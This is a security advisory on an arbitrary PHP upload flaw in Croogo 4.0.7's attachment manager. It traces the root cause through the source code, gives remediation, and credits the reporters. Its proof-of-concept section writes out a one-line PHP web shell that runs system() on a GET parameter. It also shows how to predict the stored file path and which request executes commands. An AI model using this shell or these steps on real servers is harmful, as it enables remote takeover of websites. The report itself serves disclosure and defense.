# Croogo Attachments Upload Lacks Extension/MIME Filtering Allowing Arbitrary PHP Upload and Remote Code Execution

## Summary

Croogo 4.0.7 attachment upload flow does not enforce any extension whitelist or MIME consistency check. In FileManager/src/Event/LocalAttachmentStorageHandler.php, the onBeforeSave() handler derives the stored file extension directly from the uploaded file name (FileStorageUtils::fileExtension($file['name'])) and stores the file as /assets/{crc32-path}/{sha1(raw)}.{ext} under the web-accessible webroot. An authenticated user with at least the publisher role can upload an attachment named shell.php whose content is PHP code; the resulting file is saved under the web root and can be requested directly to execute arbitrary commands. The random directory is derived from crc32 of the content and the file name from sha1 of the content, so the final URL is fully predictable by the attacker. At the same time, the URL corresponding to the uploaded file can also be viewed on the backend attachment management page.

## Details

Root cause: the upload persistence handler in FileManager/src/Event/LocalAttachmentStorageHandler.php:onBeforeSave() (lines 54-92) trusts the client-supplied file name for the stored extension and never validates the file type. Line 62 executes:

$extension = strtolower(FileStorageUtils::fileExtension($file['name']));

FileStorageUtils::fileExtension() (FileManager/src/Utility/FileStorageUtils.php:24-34) simply splits the name on '.' and returns the last segment, with no whitelist/blacklist. The MIME type obtained by __getImageInfo() (finfo_file) is only recorded in $storage['mime_type'] and never enforced; when it is unavailable the client-supplied $file['type'] is used instead.

Trust boundary failure: the file upload validation layer provides no security boundary at all.

- AssetsTable::checkFileUpload() (FileManager/src/Model/Table/AssetsTable.php:88-108) only maps PHP upload error codes (UPLOAD_ERR_*) to messages; it does not inspect the file extension, content or MIME type.
- AssetsTable::validationDefault() (AssetsTable.php:48-54) only requires the 'adapter' field to be present.
- AttachmentsController::add() (FileManager/src/Controller/Admin/AttachmentsController.php:177-200) calls newEntity($data) + save($entity) directly without type filtering.

Source-to-sink chain:

1. Source: POST /admin/file-manager/attachments/add with multipart field file (filename shell.php, content ) and asset[adapter]=LocalAttachment (form default per FileManager/src/Template/Admin/Attachments/add.ctp:89-93).
2. AttachmentsController::add() (AttachmentsController.php:185-200) creates the entity and saves it.
3. AssetsTable::beforeSave() (AssetsTable.php:56-74) dispatches the FileStorage.beforeSave event; LocalAttachmentStorageHandler::onBeforeSave() handles persistence (adapter must equal 'LocalAttachment', checked in BaseStorageHandler::_check()).
4. Sink (LocalAttachmentStorageHandler.php:60-77): $raw = file_get_contents(tmp_name); $key = sha1($raw); $extension = fileExtension($file['name']); $prefix = randomPath($raw) (crc32 based, FileStorageUtils.php:46-63); $fullpath = $prefix . '/' . $key . '.' . $extension; $filesystem->write($fullpath, $raw) writes the PHP file under WWW_ROOT/assets (adapter root configured in FileManager/config/bootstrap.php:28-33).
5. The saved file is web-accessible at /assets/{crc32-path}/{sha1}.php and executed by PHP on direct request.

Privilege context: InstallManager::setupGrants() (Install/src/InstallManager.php:292) grants 'controllers/Croogo\FileManager/Admin/Attachments' to the publisher role; controller-level ACL grants propagate to all actions (CachedDbAcl parent::check() walks the ACO tree), and superadmin bypasses ACL entirely. The saved location is fully predictable: crc32($content) yields the directory and sha1($content) the file name, both computable offline.

Core vulnerable code path:

```php
// FileManager/src/Event/LocalAttachmentStorageHandler.php:54-92
$file = $storage->file;
$filesystem = StorageManager::adapter($storage->adapter);
try {
    if (!file_exists($file['tmp_name'])) {
        throw new Exception($this->Attachments->Assets->checkFileUpload($storage));
    }
    $raw = file_get_contents($file['tmp_name']);
    $key = sha1($raw);
    $extension = strtolower(FileStorageUtils::fileExtension($file['name']));

    $imageInfo = $this->__getImageInfo($file['tmp_name']);
    if (isset($imageInfo['mimeType'])) {
        $mimeType = $imageInfo['mimeType'];
    } else {
        $mimeType = $file['type'];
    }

    $prefix = null;
    if (empty($storage['path'])) {
        $prefix = FileStorageUtils::trimPath(FileStorageUtils::randomPath($raw));
    }
    $fullpath = $prefix . '/' . $key . '.' . $extension;
    $result = $filesystem->write($fullpath, $raw);
    $storage['path'] = '/assets/' . $fullpath;
```

The stored extension is taken from the client-controlled file name with no whitelist, and the MIME value is only recorded, never enforced. A file named shell.php with PHP content is written by the Flysystem local adapter to WWW_ROOT/assets/{crc32-path}/{sha1}.php, a web-accessible location where PHP executes.

```php
// FileManager/src/Controller/Admin/AttachmentsController.php:177-200
public function add()
{
    $this->set('title_for_layout', __d('croogo', 'Add Attachment'));

    if ($this->getRequest()->getQuery('editor')) {
        $this->viewBuilder()->setLayout('admin_popup');
    }

    if ($this->getRequest()->is('post')) {
        $data = $this->getRequest()->getData();
        if (!empty($data)) {
            $entity = $this->Attachments->newEntity($data);
            $errors = $entity->getErrors();
        } else {
            $errors = [
                'file' => __d('croogo', 'Upload failed. Please ensure size does not exceed the server limit.')
            ];
        }

        if (empty($errors)) {
            $attachment = $this->Attachments->save($entity);
```

The add() action marshals the multipart data (including the file and asset[adapter]=LocalAttachment) into an entity and saves it without any extension/MIME/content filtering, entering the vulnerable persistence path.

```php
// FileManager/src/Model/Table/AssetsTable.php:88-108
public function checkFileUpload($check)
{
    switch ($check['file']['error']) {
        case UPLOAD_ERR_INI_SIZE:
            return 'The uploaded file exceeds the upload_max_filesize directive in php.ini';
        case UPLOAD_ERR_FORM_SIZE:
            return 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form';
        case UPLOAD_ERR_PARTIAL:
            return 'The uploaded file was only partially uploaded.';
        case UPLOAD_ERR_NO_FILE:
            return 'No file was uploaded.';
        case UPLOAD_ERR_NO_TMP_DIR:
            return 'Missing a temporary folder.';
        case UPLOAD_ERR_CANT_WRITE:
            return 'Failed to write file to disk.';
        case UPLOAD_ERR_EXTENSION:
            return 'A PHP extension stopped the file upload.';
        case UPLOAD_ERR_OK:
            return true;
    }
}
```

checkFileUpload() only maps PHP upload error codes and performs no extension, MIME, or content inspection, so the upload validation layer provides no protection against executable file types.

```php
// FileManager/src/Utility/FileStorageUtils.php:24-54
public static function fileExtension($name)
{
    $list = explode('.', $name);
    if (count($list) > 1) {
        $ext = $list[count($list) - 1];

        return $ext;
    }

    return false;
}

public static function randomPath($string, $level = 3)
{
    if (!$string) {
        throw new InvalidArgumentException('First argument is not a string!');
    }
    $string = crc32($string);

    $decrement = 0;
    $path = null;
```

fileExtension() returns the raw last dot-separated segment with no whitelist, and randomPath() derives the storage subdirectory from crc32 of the file content, making the final storage path fully predictable by the attacker.

```php
// FileManager/config/bootstrap.php:28-33
StorageManager::config('LocalAttachment', [
    'description' => 'Local Attachment',
    'adapterOptions' => [WWW_ROOT . 'assets', true],
    'adapterClass' => '\League\Flysystem\Adapter\Local',
    'class' => '\League\Flysystem\Filesystem',
]);
```

The LocalAttachment adapter root is WWW_ROOT . 'assets', i.e. a directory inside the web root, so uploaded .php files are directly reachable and executed by the web server.

## POC

Preconditions:

- An authenticated account with the publisher role (or superadmin) on a Croogo 4.0.7 deployment.
- Ability to obtain the admin CSRF token from any admin page.
- The web server executes .php files under the web root (default configuration).

Step 1 - Upload a PHP web shell as an attachment:

- Method: POST
- Endpoint: /admin/file-manager/attachments/add
- Headers: Cookie: , Content-Type: multipart/form-data; boundary=----b
- Body parts: asset[adapter] = LocalAttachment; file (filename="shell.php", Content-Type: application/octet-stream) =
- Expected result: HTTP 200/302 with flash message 'The Attachment has been saved'.
<img width="2721" height="1378" alt="image" src="https://github.com/user-attachments/assets/e32b2604-c743-4b73-9c4a-d46d62264a89" />
<img width="3393" height="1375" alt="image" src="https://github.com/user-attachments/assets/a1dbb9cc-cab8-4f90-821e-0d2923ee9cdd" />

Step 2 - Compute the saved location locally and access the web shell:

- The saved path is /assets/{dir}/{name}.php where {dir} is derived from crc32(content) by randomPath() and {name} is sha1(content). Both values can be computed offline from the uploaded content. For example, construct the webshell content `RAW=<?php if(isset($_GET['c'])){system($_GET['c']);} ?>`, calculate the CRC locally (`crc=zlib.crc32(RAW)&0xffffffff=542997` [using unsigned `zlib.crc32`]) → `padded="000000542997"` → `dir=padded[-2:]='97',[-4:-2]='54',[-6:-4]='29'`; calculate the SHA-1 hash (`sha1=hashlib.sha1(RAW).hexdigest()=c92f9ac8073090a0af3b3ed72437abea2327f84b`), and predict the path `assets/{dir0}/{dir1}/{dir2}/{sha1}.php=assets/97/54/29/c92f9ac8073090a0af3b3ed72437abea2327f84b.php`.
- At the same time, the URL corresponding to the uploaded file can also be viewed on the backend attachment management page.
- Method: GET
- Endpoint: /assets/97/54/29/c92f9ac8073090a0af3b3ed72437abea2327f84b.php?c=id
- Expected result: HTTP 200 returning the output of the id command (e.g. uid=0(root) ...), confirming remote code execution.
<img width="2276" height="772" alt="image" src="https://github.com/user-attachments/assets/8bdef14d-39c1-4cce-bee6-96fd28768964" />
<img width="1179" height="218" alt="image" src="https://github.com/user-attachments/assets/4386d893-1790-4dae-8443-5afbc35ed407" />

## Impact

Confidentiality: full server access enables reading of configuration, credentials, application source and data. Integrity: an attacker can plant, modify, or delete arbitrary files reachable by the web server user. Availability: an attacker can overwrite application files or exhaust storage. Overall: remote code execution as the web server user, complete compromise of the Croogo instance, and a foothold for lateral movement on the host.

## Remediation

1. Enforce an extension whitelist (e.g. images/documents only) in the upload persistence path (LocalAttachmentStorageHandler::onBeforeSave), rejecting any file whose extension is not allowed.
2. Validate the real file type with finfo_file()/getimagesize() and require it to match the extension; reject files containing executable script markers.
3. Store uploads outside the web-executable path: configure the storage root in a non-PHP directory and disable PHP execution for the upload directory in the web server (e.g. Nginx 'location /assets/ { ... }' without PHP, or Apache 'php_flag engine off').
4. Add regression tests asserting that .php/.phtml uploads are rejected.

## Supplemental Information

### Affected products

- Vendor / project: croogo
- Repository: https://github.com/croogo/croogo
- Issue：https://github.com/croogo/croogo/issues/1011
- Package name: croogo/croogo
- Affected versions: 4.0.7
- Fixed version: unknown / not confirmed.

### Vulnerability type

- Arbitrary file upload
- CWE: CWE-434 Unrestricted Upload of File with Dangerous Type
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
